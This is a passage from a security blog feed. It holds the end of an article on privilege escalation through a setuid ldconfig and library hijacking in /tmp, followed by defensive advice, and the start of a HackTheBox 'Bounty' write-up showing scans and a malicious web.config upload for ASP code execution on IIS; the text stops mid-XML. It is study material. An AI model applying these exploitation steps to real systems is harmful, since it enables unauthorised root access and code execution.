&lt;h3 id=&quot;3-setuid-bit-on-ldconfig&quot;&gt;3. Setuid bit on ldconfig&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt; is used to create, udpate and remove symbolic links for the current shared libraries based on the lib directories present in &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;.
&lt;span style=&quot;color:red&quot;&gt;This application has no setuid bit enabled by default but if an unconscious administrator sets it, he is exposing himself to some serious issues.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt; is a configuration file pointing to other configuration files that will help the linker to locate libraries.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ld.so.conf
include /etc/ld.so.conf.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside &lt;strong&gt;/etc/ld.so.conf.d/&lt;/strong&gt;, you can have several files with each of them specifying a directory to explore when searching for libraries.
For example, &lt;strong&gt;libc.conf&lt;/strong&gt; contains the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/etc/ld.so.conf.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;libc.conf
&lt;span class=&quot;c&quot;&gt;# libc default configuration&lt;/span&gt;
/usr/local/lib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;If a hazardous administrator creates a configuration file, which adds a world-writable directory (i.e. &lt;strong&gt;/tmp&lt;/strong&gt;) to the group of directories being checked by the linker, an attacker could place its malicious library here.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;It won’t be sufficient for our exploit though! We now need to use &lt;strong&gt;ldconfig&lt;/strong&gt; to update the linker’s cache so that it will be aware of this new evil library.
The cache can be updated with &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt; without specifying any parameter. However, it has to be executed as root… This is where the setuid bit comes into play. Let me show you.&lt;/p&gt;

&lt;p&gt;The configuration file from where everything starts:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ld.so.conf.d/shouldnt_be_here.conf
/tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The evil library placed inside /tmp:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /tmp/
total 12
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 boiteaklou boiteaklou 7096 Nov 20 11:01 libcustom.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; output &lt;strong&gt;BEFORE&lt;/strong&gt; executing &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7759000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /usr/lib/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb774c000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# Pointing to the original library&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7596000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb775a000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; output &lt;strong&gt;AFTER&lt;/strong&gt; executing &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldconfig
boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77c8000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77bb000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# Now pointing to /tmp/libcustom.so&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7605000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77c9000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we execute the application…&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;…And the exploit works just fine!&lt;/p&gt;

&lt;h4 id=&quot;alternative-to-etcldsoconf&quot;&gt;Alternative to /etc/ld.so.conf&lt;/h4&gt;

&lt;p&gt;What I just showed you is working, but actually, there’s even simpler. &lt;span style=&quot;color:red&quot;&gt;The configuration file including &lt;strong&gt;/tmp&lt;/strong&gt; is not mandatory since we have the setuid bit set on &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt;&lt;/span&gt;. Indeed, &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig -f&lt;/code&gt; allows us to use a different configuration file from the existing &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;What we have to do is pretty simple, follow the example.&lt;/p&gt;

&lt;p&gt;We create our fake &lt;strong&gt;ld.so.conf&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;include /tmp/conf/*&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; fake.ld.so.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we add a configuration file to the location indicated by &lt;strong&gt;fake.ld.so.conf&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/tmp&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; conf/evil.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we execute &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt; with the -f option:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldconfig &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; fake.ld.so.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we enjoy the result:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7761000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7754000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb759e000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7762000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Even more straight-forward! :smile:&lt;/p&gt;

&lt;h2 id=&quot;how-can-we-defend-against-this&quot;&gt;How can we defend against this?&lt;/h2&gt;

&lt;p&gt;As a general principle, &lt;strong&gt;DO NOT set the setuid bit&lt;/strong&gt; on a program if you don’t asbolutely control every aspect of its execution, a lot of them can be used in a way that allows privilege escalations.&lt;/p&gt;

&lt;p&gt;Another fundamental aspect that shouldn’t be left behind is the &lt;strong&gt;management of user permissions&lt;/strong&gt;. As we’ve seen earlier, allowing a user to write inside /usr/lib can lead to severe security issues. If you’re a system administrator, ensure that low-privileged users can’t write to:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;/usr/lib&lt;/strong&gt; and &lt;strong&gt;/lib&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Locations specified by &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;If &lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt; is set by default on your system, the user shouldn’t be able to write at the location specified by this variable.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More generally, ensure that every action performed by users are executed with the lowest privileges.&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Linux applications often use dynamically linked shared object libraries. These libraries allow code flexbility but they have their drawbacks… In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways. Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommandations on how to protect your system against it in the final part of the article.</summary></entry><entry><title type="html">HackTheBox: Bounty writeup - Metasploit basics</title><link href="http://localhost:4000/HackTheBox-Bounty.html" rel="alternate" type="text/html" title="HackTheBox: Bounty writeup - Metasploit basics" /><published>2018-10-28T22:00:00+01:00</published><updated>2018-10-28T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Bounty</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Bounty.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/bounty-box.png&quot; alt=&quot;Bounty box&quot; title=&quot;Bounty Box&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This machine was pretty easy so I’m going to take this opportunity to explain you &lt;strong&gt;the basics of the Metasploit framework&lt;/strong&gt;.
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#metasploit-introduction&quot; id=&quot;markdown-toc-metasploit-introduction&quot;&gt;Metasploit Introduction&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#initial-foothold&quot; id=&quot;markdown-toc-initial-foothold&quot;&gt;Initial Foothold&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-application-mapping&quot; id=&quot;markdown-toc-web-application-mapping&quot;&gt;Web Application mapping&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#user-access&quot; id=&quot;markdown-toc-user-access&quot;&gt;User Access&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#meterpreter-shell&quot; id=&quot;markdown-toc-meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#meterpreter-shell-payload&quot; id=&quot;markdown-toc-meterpreter-shell-payload&quot;&gt;Meterpreter Shell Payload&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#payload-incorporation&quot; id=&quot;markdown-toc-payload-incorporation&quot;&gt;Payload Incorporation&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#upload-webconfig-and-access-it&quot; id=&quot;markdown-toc-upload-webconfig-and-access-it&quot;&gt;Upload web.config and access it&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#back-to-msfconsole&quot; id=&quot;markdown-toc-back-to-msfconsole&quot;&gt;Back to msfconsole&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#gimme-this-usertxt&quot; id=&quot;markdown-toc-gimme-this-usertxt&quot;&gt;Gimme this user.txt&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#local-exploit-suggester&quot; id=&quot;markdown-toc-local-exploit-suggester&quot;&gt;Local Exploit Suggester&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ms10_092_schelevator&quot; id=&quot;markdown-toc-ms10_092_schelevator&quot;&gt;ms10_092_schelevator&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#final-words&quot; id=&quot;markdown-toc-final-words&quot;&gt;Final Words&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;metasploit-introduction&quot;&gt;Metasploit Introduction&lt;/h2&gt;

&lt;p&gt;Metasploit is an open-source pentesting framework distributed by &lt;strong&gt;Rapid7&lt;/strong&gt;. It is extremly powerful and easy to use once you understand the logic.&lt;/p&gt;

&lt;p&gt;You can use it for generating a bunch of payloads for every system or languages with &lt;strong&gt;msfvenom&lt;/strong&gt;. It can also be run as an interactive console for connecting to the target system and exploiting it without leaving the console.&lt;/p&gt;

&lt;p&gt;Metasploit relies on &lt;strong&gt;modules&lt;/strong&gt;, which are specifically designed to exploit vulnerabilities. Each module has &lt;strong&gt;a list of options&lt;/strong&gt; that you have to set in order to adapt the exploit to your specific environment. Then, you type “exploit” and &lt;strong&gt;Metasploit does the job for you&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;This tool is &lt;strong&gt;extremely powerful&lt;/strong&gt; when you want to exploit something quickly but it is &lt;strong&gt;not the best approach&lt;/strong&gt; in a learning process because everything is done hunder the hood and you don’t really know what happens on the system. To be used with caution… :wink:&lt;/p&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;Back to our Bounty machine, we will perform the usual steps of &lt;strong&gt;information gathering&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port scanning&lt;/h3&gt;

&lt;p&gt;First, run a &lt;strong&gt;nmap&lt;/strong&gt; scan with default scripts and version detection enabled. We will run a deeper scan if nothing is found.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.70 scan initiated Sun Oct 21 13:58:33 2018 as: nmap -sC -sV -oA nmap/bounty 10.10.10.93&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.93
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.039s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Oct 21 13:58:45 2018 -- 1 IP address (1 host up) scanned in 12.07 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A single open port doesn’t seem like much so we will run a deeper scan in background while we start investigating this website.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;We can notice that the webserver runs on IIS 7.5, which is completely outdated since the last version is 10.0.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;web-application-mapping&quot;&gt;Web Application mapping&lt;/h3&gt;

&lt;p&gt;A good practice for saving time is to start running a directory listing tool such as &lt;strong&gt;dirbuster&lt;/strong&gt; or &lt;strong&gt;gobuster&lt;/strong&gt; before playing with the website’s features manually. I prefer using &lt;strong&gt;gobuster&lt;/strong&gt; since it’s a bit faster.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty/dirb&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.93/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/bounty
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The scan will take a few minutes so we will check the results later.&lt;/p&gt;

&lt;p&gt;Let’s see what this website looks like…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/website.png&quot; alt=&quot;Bounty website&quot; title=&quot;Bounty website&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A wonderful merlin drawing! It might be an hint.&lt;/p&gt;

&lt;p&gt;The source code doesn’t reveal anything more… Hopefully gobuster will fly to our rescue!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;gobuster/bounty
/UploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/uploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/uploadedfiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;/uploadedfiles/&lt;/strong&gt; directory seems very interesting but access is denied. However, an educated guess could tell that there should be an upload page somewhere…&lt;/p&gt;

&lt;p&gt;We also know that the server is running on IIS so file extensions should be &lt;strong&gt;asp&lt;/strong&gt; or &lt;strong&gt;aspx&lt;/strong&gt;. We can refine our search by adding &lt;code class=&quot;highlighter-rouge&quot;&gt;-x .aspx&lt;/code&gt; to gobuster, based on the assumptions we just made.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.93/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .aspx &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/bounty.aspx

&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.0              OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Mode         : dir
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url/Domain   : http://10.10.10.93/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads      : 50
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes : 200,204,301,302,307,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions   : aspx
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout      : 10s
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
2018/10/27 22:43:30 Starting gobuster
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
/transfer.aspx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running it only a few seconds is enough to reveal &lt;strong&gt;transfer.aspx&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/transfer.png&quot; alt=&quot;Transfer.aspx&quot; title=&quot;Transfer.aspx&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found our entry point. Let’s exploit it!&lt;/p&gt;

&lt;h2 id=&quot;user-access&quot;&gt;User Access&lt;/h2&gt;

&lt;p&gt;Googling “IIS 7.5 upload RCE” teaches us that &lt;strong&gt;ASP&lt;/strong&gt; code can be executed by uploading a file called &lt;strong&gt;web.config&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;We will test if the website is vulnerable by uploading the following file:&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;handlers&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;accessPolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read, Script, Write&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web_config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*.config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;verb=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;modules=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IsapiModule&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scriptProcessor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%windir%\system32\inetsrv\asp.dll&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;resourceType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unspecified&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;requireAccess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;preCondition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bitness64&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;         
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/handlers&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;requestFiltering&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;fileExtensions&amp;gt;&lt;/span&gt;
